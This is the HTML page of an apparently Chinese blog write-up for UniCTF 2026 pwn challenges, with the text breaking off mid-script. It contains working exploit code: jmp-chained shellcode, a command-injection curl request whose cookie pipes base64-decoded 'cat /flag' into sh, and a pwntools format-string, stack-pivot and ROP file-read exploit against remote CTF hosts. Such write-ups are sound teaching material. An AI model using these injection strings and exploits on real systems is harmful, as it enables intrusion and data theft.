<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>UniCTF 2026 WP | Auceptin's Blog</title><meta name="author" content="Auceptin"><meta name="copyright" content="Auceptin"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="为期一周，中间夹杂着其他的事，做得蛮累的 什么？我不是汇编高手吗？将输入指令以四字节为单位，用0xE9分割后执行 0xE9对应的汇编是短距离jmp，将后续四字节识别为偏移，然后跳转到rip + offset + 5的地址继续执行 精确计算的offset可以跳转到自定义四字节的开头，所以理论上可以任意不超过4字节汇编指令执行 没有PIE有后门函数，思路是将函数地址写入rax然后call rax，其中">
<meta property="og:type" content="article">
<meta property="og:title" content="UniCTF 2026 WP">
<meta property="og:url" content="https://aucept.in/2026/02/03/UniCTF/index.html">
<meta property="og:site_name" content="Auceptin&#39;s Blog">
<meta property="og:description" content="为期一周，中间夹杂着其他的事，做得蛮累的 什么？我不是汇编高手吗？将输入指令以四字节为单位，用0xE9分割后执行 0xE9对应的汇编是短距离jmp，将后续四字节识别为偏移，然后跳转到rip + offset + 5的地址继续执行 精确计算的offset可以跳转到自定义四字节的开头，所以理论上可以任意不超过4字节汇编指令执行 没有PIE有后门函数，思路是将函数地址写入rax然后call rax，其中">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://aucept.in/image/cover48_shooting_star.jpg">
<meta property="article:published_time" content="2026-02-03T02:00:17.000Z">
<meta property="article:modified_time" content="2026-02-11T08:27:02.506Z">
<meta property="article:author" content="Auceptin">
<meta property="article:tag" content="pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://aucept.in/image/cover48_shooting_star.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "UniCTF 2026 WP",
  "url": "https://aucept.in/2026/02/03/UniCTF/",
  "image": "https://aucept.in/image/cover48_shooting_star.jpg",
  "datePublished": "2026-02-03T02:00:17.000Z",
  "dateModified": "2026-02-11T08:27:02.506Z",
  "author": [
    {
      "@type": "Person",
      "name": "Auceptin",
      "url": "https://aucept.in/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://aucept.in/2026/02/03/UniCTF/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"prismjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'UniCTF 2026 WP',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prism-themes@1.9.0/themes/prism-dracula.min.css" id="prism-light-theme"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/themes/prism-twilight.min.css" id="prism-dark-theme" disabled><style>
  /* 根据 Butterfly 主题切换代码高亮样式 */
  [data-theme="dark"] #prism-light-theme {
    display: none !important;
  }
  [data-theme="light"] #prism-dark-theme {
    display: block !important;
  }
  html:not([data-theme]) #prism-dark-theme {
    display: none !important;

  
  /* 数学公式美化样式 */
  .MathJax_Display {
    margin: 1.5em 0 !important;
    text-align: center !important;
  }
  
  .MathJax {
    font-size: 1.1em !important;
  }
  
  /* 行内公式样式 */
  .MathJax_Preview {
    color: inherit;
  }
  
  /* 块级公式容器美化 */
  .MathJax_Display {
    background: rgba(0,0,0,0.02);
    border-radius: 8px;
    padding: 15px 20px;
    margin: 20px 0;
    box-shadow: 0 2px 8px rgba(0,0,0,0.1);
    border-left: 4px solid #49b1f5;
  }
  
  /* 暗色模式下的公式样式 */
  [data-theme="dark"] .MathJax_Display {
    background: rgba(255,255,255,0.05);
    border-left-color: #1f2937;
    box-shadow: 0 2px 8px rgba(0,0,0,0.3);
  }
  
  /* 公式编号样式 */
  .MathJax .mjx-math .mjx-mrow .mjx-mtable .mjx-label {
    color: #666;
    font-size: 0.9em;
  }
  
  /* 提升公式清晰度 */
  .MathJax svg {
    max-width: 100% !important;
    height: auto !important;
  }
</style>
<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Auceptin's Blog" type="application/atom+xml">
</head><body><div id="web_bg" style="background-color: #f5f5f5;"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/auceptin-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">42</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">35</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/friends/"><span> Friends</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/image/cover2_square.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Auceptin's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">UniCTF 2026 WP</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/friends/"><span> Friends</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">UniCTF 2026 WP</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-02-03T02:00:17.000Z" title="发表于 2026-02-03 10:00:17">2026-02-03</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-02-11T08:27:02.506Z" title="更新于 2026-02-11 16:27:02">2026-02-11</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/">ctf</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>为期一周，中间夹杂着其他的事，做得蛮累的</p>
<h2 id="什么？我不是汇编高手吗？"><a href="#什么？我不是汇编高手吗？" class="headerlink" title="什么？我不是汇编高手吗？"></a>什么？我不是汇编高手吗？</h2><p>将输入指令以四字节为单位，用0xE9分割后执行</p>
<p>0xE9对应的汇编是短距离jmp，将后续四字节识别为偏移，然后跳转到rip + offset + 5的地址继续执行</p>
<p>精确计算的offset可以跳转到自定义四字节的开头，所以理论上可以任意不超过4字节汇编指令执行</p>
<p>没有PIE有后门函数，思路是将函数地址写入rax然后call rax，其中向rax写入地址需要拆成多步完成</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> payload
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x1</span><span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> content

add<span class="token punctuation">(</span>p32<span class="token punctuation">(</span><span class="token number">0x406a9090</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>p32<span class="token punctuation">(</span><span class="token number">0x58909090</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>p32<span class="token punctuation">(</span><span class="token number">0x9010e0c1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>p32<span class="token punctuation">(</span><span class="token number">0x12110566</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>p32<span class="token punctuation">(</span><span class="token number">0x9090d0ff</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>执行时像这样：<br><pre class="line-numbers language-text" data-language="text"><code class="language-text">► 0x7c778587d000    jmp    0x7c778587d006              &lt;0x7c778587d006>
   ↓
  0x7c778587d006    nop
  0x7c778587d007    nop
  0x7c778587d008    push   0x40
  0x7c778587d00a    jmp    0x7c778587d010              &lt;0x7c778587d010>
   ↓
  0x7c778587d010    nop
  0x7c778587d011    nop
  0x7c778587d012    nop
  0x7c778587d013    pop    rax      RAX => 0x40
  0x7c778587d014    jmp    0x7c778587d01a              &lt;0x7c778587d01a>
   ↓
  0x7c778587d01a    shl    eax, 0x10
  0x7c778587d01d    nop
  0x7c778587d01e    jmp    0x7c778587d024              &lt;0x7c778587d024>
   ↓
  0x7c778587d024    add    ax, 0x1211     AX => 0x1211 (0x0 + 0x1211)
  0x7c778587d028    jmp    0x7c778587d02e              &lt;0x7c778587d02e>
   ↓
  0x7c778587d02e    call   rax                         &lt;getshell+27><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h2 id="Uni-check"><a href="#Uni-check" class="headerlink" title="Uni_check"></a>Uni_check</h2><p>一个go语言写的服务器，有两个功能，下载和检查</p>
<p>程序会在当前目录下存储cookie文件，可以自己指定内容（cookie文件名），检查功能会扫描文件内容是否合规，对于不合规的会执行删除，这里的逻辑是<br><code>delete_cmd = f&quot;rm -f &#123;self.base_dir&#125;/&#123;fname&#125;&quot;</code></p>
<p>删除指令是直接拼接的，于是通过<code>;``&amp;&amp;</code>一类的符号实现命令注入</p>
<p>还有go语言处理路径的问题，可以用<code>../</code>把文件写入上级目录</p>
<p>利用的思路是cat /flag到当前文件夹，然后下载下来的文件里就包含了flag，但是flag在根目录，有些字符如<code>/</code>是不能出现在文件名里的</p>
<p>最终的利用命令如下：<br><code>curl -v -b &quot;session=../test.txt&amp;&amp;echo Y2F0IC9mbGFnID4gZmxhZ19vdXQ=|base64 -d|sh;.txt&quot; http://nc1.ctfplus.cn:port</code></p>
<h2 id="speak"><a href="#speak" class="headerlink" title="speak"></a>speak</h2><p>沙箱环境的格式化字符串，前期比较正常一次泄露一次足够长的篡改，但是输出后直接用syscall退出，所以只好篡改printf的返回地址然后打orw</p>
<p>rop链是放在栈上的，需要利用一次栈迁移把返回地址改到rop链的开头，把返回地址放栈上，内容指向leave ret再改对应的rbp：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">"amd64"</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">"linux"</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">"debug"</span><span class="token punctuation">,</span> terminal<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span> <span class="token string">"splitw"</span><span class="token punctuation">,</span> <span class="token string">"-h"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc.so.6"</span><span class="token punctuation">)</span>
<span class="token comment">#p = process("./pwn")</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"nc1.ctfplus.cn"</span> <span class="token punctuation">,</span><span class="token number">23124</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"name:"</span><span class="token punctuation">)</span>

leak_payload <span class="token operator">=</span> <span class="token string">b"aaaabbbbccccddddeeeeffffgggghhhh%2$p %9$p %63$p?"</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>leak_payload<span class="token punctuation">)</span>

output <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"?"</span><span class="token punctuation">)</span>
cleaned <span class="token operator">=</span> output<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b"(nil)"</span><span class="token punctuation">,</span> <span class="token string">b"0x0"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">b"? \n"</span><span class="token punctuation">)</span>
parts <span class="token operator">=</span> cleaned<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span>

leaked_libc <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>parts<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
leaked_stack <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>parts<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
leaked_text <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>parts<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>

printf_ret <span class="token operator">=</span> leaked_stack <span class="token operator">-</span> <span class="token number">0x6B8</span> <span class="token operator">+</span> <span class="token number">0x5D8</span>
buffer_addr <span class="token operator">=</span> leaked_stack <span class="token operator">-</span> <span class="token number">0xc8</span>

libc_base <span class="token operator">=</span> leaked_libc <span class="token operator">-</span> <span class="token number">0x804643</span> <span class="token operator">+</span> <span class="token number">0x660100</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"printf"</span><span class="token punctuation">]</span>
leaked_main <span class="token operator">=</span> leaked_text <span class="token operator">-</span> <span class="token number">0x7d60</span> <span class="token operator">+</span> <span class="token number">0x53dd</span>  
libc<span class="token punctuation">.</span>address <span class="token operator">=</span> libc_base
elf_base <span class="token operator">=</span> leaked_main <span class="token operator">-</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"main"</span><span class="token punctuation">]</span>
elf<span class="token punctuation">.</span>address <span class="token operator">=</span> elf_base
printf_addr <span class="token operator">=</span> leaked_main <span class="token operator">-</span> <span class="token number">0x3dd</span> <span class="token operator">+</span> <span class="token number">0x4af</span>
again_addr <span class="token operator">=</span> leaked_main <span class="token operator">-</span> <span class="token number">0x3dd</span> <span class="token operator">+</span> <span class="token number">0x496</span>

rop_libc <span class="token operator">=</span> ROP<span class="token punctuation">(</span>libc<span class="token punctuation">)</span>
pop_rdi <span class="token operator">=</span> rop_libc<span class="token punctuation">.</span>find_gadget<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"pop rdi"</span><span class="token punctuation">,</span> <span class="token string">"ret"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>address
pop_rsi <span class="token operator">=</span> rop_libc<span class="token punctuation">.</span>find_gadget<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"pop rsi"</span><span class="token punctuation">,</span> <span class="token string">"ret"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>address
pop_rbp <span class="token operator">=</span> rop_libc<span class="token punctuation">.</span>find_gadget<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"pop rbp"</span><span class="token punctuation">,</span> <span class="token string">"ret"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>address
pop_rdx_leave <span class="token operator">=</span> rop_libc<span class="token punctuation">.</span>find_gadget<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"pop rdx"</span><span class="token punctuation">,</span> <span class="token string">"leave"</span><span class="token punctuation">,</span> <span class="token string">"ret"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>address

pop_rdx_g <span class="token operator">=</span> pop_rdx_leave
pop_rdx_extra <span class="token operator">=</span> <span class="token number">0x0</span> 
rop_elf <span class="token operator">=</span> ROP<span class="token punctuation">(</span>elf<span class="token punctuation">)</span>
leave_ret <span class="token operator">=</span> rop_elf<span class="token punctuation">.</span>find_gadget<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"leave"</span><span class="token punctuation">,</span> <span class="token string">"ret"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>address

open_addr <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"open"</span><span class="token punctuation">]</span>
read_addr <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span>
write_addr <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"write"</span><span class="token punctuation">]</span>

bss_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x800</span>

rop_offset <span class="token operator">=</span> <span class="token number">0x60</span>
fake_rbp <span class="token operator">=</span> buffer_addr <span class="token operator">+</span> rop_offset <span class="token operator">-</span> <span class="token number">0x10</span>

writes <span class="token operator">=</span> <span class="token punctuation">&#123;</span>printf_ret <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">:</span> p16<span class="token punctuation">(</span>fake_rbp <span class="token operator">&amp;</span> <span class="token number">0xFFFF</span><span class="token punctuation">)</span><span class="token punctuation">,</span> printf_ret<span class="token punctuation">:</span> p16<span class="token punctuation">(</span>leave_ret <span class="token operator">&amp;</span> <span class="token number">0xFFFF</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>
fmt_payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> writes<span class="token punctuation">,</span> write_size<span class="token operator">=</span><span class="token string">"short"</span><span class="token punctuation">,</span> strategy<span class="token operator">=</span><span class="token string">"fast"</span><span class="token punctuation">)</span>
fmt_payload <span class="token operator">=</span> fmt_payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span>rop_offset<span class="token punctuation">,</span> <span class="token string">b"A"</span><span class="token punctuation">)</span>

stage1 <span class="token operator">=</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span> <span class="token comment">#buffer_addr + 0x50</span>
stage1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>buffer_addr <span class="token operator">+</span> <span class="token number">0x100</span> <span class="token operator">-</span> <span class="token number">0x28</span><span class="token punctuation">)</span>
stage1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rsi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
stage1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>open_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token comment"># 执行到open时，rdx为0，不用设置，返回值（文件描述符为3）</span>
stage1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi<span class="token punctuation">)</span>
stage1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rbp<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>buffer_addr <span class="token operator">+</span> <span class="token number">0x100</span> <span class="token operator">-</span> <span class="token number">0x40</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_leave<span class="token punctuation">)</span>
stage1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr <span class="token operator">+</span> <span class="token number">0x110</span><span class="token punctuation">)</span>
stage1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>read_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>printf_addr<span class="token punctuation">)</span>
stage1 <span class="token operator">+=</span> <span class="token string">b"./flag\x00"</span>   <span class="token comment">#到0x100</span>


payload <span class="token operator">=</span> fmt_payload <span class="token operator">+</span> stage1
<span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0x100</span><span class="token punctuation">:</span>
    <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string">"stage1 payload exceeds 0x100"</span><span class="token punctuation">)</span>

<span class="token comment">#gdb.attach(p)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"buffer addr</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>buffer_addr<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>格式化字符串还是一如既往地繁琐</p>
<h2 id="smcode"><a href="#smcode" class="headerlink" title="smcode"></a>smcode</h2><p>任意输入执行，但是只能用斐波那契数列里的字节</p>
<p>光靠这些字节对应的指令肯定是无法getshell的，思路是借助al寄存器修改已写入的内容，动态构建出一些指令，最终来一个真正的任意读</p>
<p>GPT5.2给出了用于动态构建命令的神奇函数，由于是利用al完成所以如果拼出的指令对它有影响就会乱掉，好在本题只要触发read就好，可以手调</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">"amd64"</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">"linux"</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">"debug"</span><span class="token punctuation">,</span> terminal<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span> <span class="token string">"splitw"</span><span class="token punctuation">,</span> <span class="token string">"-h"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token comment">#p = process("./pwn")</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"nc1.ctfplus.cn"</span><span class="token punctuation">,</span><span class="token number">42376</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Input your shellcode"</span><span class="token punctuation">)</span>

ALLOWED <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x0D</span><span class="token punctuation">,</span> <span class="token number">0x15</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token number">0xE9</span><span class="token punctuation">&#125;</span>
ALLOWED_ADD <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0xE9</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0x15</span><span class="token punctuation">,</span> <span class="token number">0x0D</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">]</span>

READ_N <span class="token operator">=</span> <span class="token number">0x59</span>

<span class="token keyword">def</span> <span class="token function">add_eax_imm8</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">assert</span> v <span class="token keyword">in</span> ALLOWED
    <span class="token keyword">return</span> <span class="token string">b"\x05"</span> <span class="token operator">+</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"\x00\x00\x00"</span>


